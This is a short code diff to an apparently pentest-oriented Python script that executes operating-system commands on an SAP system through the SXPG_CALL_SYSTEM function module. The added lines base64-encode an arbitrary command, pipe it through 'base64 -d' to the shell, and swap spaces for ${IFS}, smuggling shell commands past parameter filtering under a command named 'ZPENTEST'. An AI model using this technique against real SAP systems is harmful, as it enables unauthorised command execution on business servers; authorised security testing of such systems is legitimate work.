@@ -1,5 +1,7 @@
 #!/usr/bin/env python3
 
+import base64
+
 try:
     from pyrfc import Connection
 except ImportError:
@@ -27,14 +29,20 @@ def execute(command: str, timeout: float = 30) -> str:
     # Establish connection to the SAP system
     conn = Connection(**conn_params)
 
-    prepared_command = command.replace(" ", "${IFS}")
+    command = base64.b64encode(
+        command.encode()
+    ).decode()  # Base64 encode the command to handle special characters
+
+    command = f"echo {command}|base64 -d|$0"
+
+    command = command.replace(" ", "${IFS}")
 
     # Call the SXPG_CALL_SYSTEM function module
     response = conn.call(
         "SXPG_CALL_SYSTEM",
         **{
-            "COMMANDNAME": "<SAP_COMMAND>",
-            "ADDITIONAL_PARAMETERS": f"-c {prepared_command}",
+            "COMMANDNAME": "ZPENTEST",
+            "ADDITIONAL_PARAMETERS": f"-c {command}",
         },
     )
 
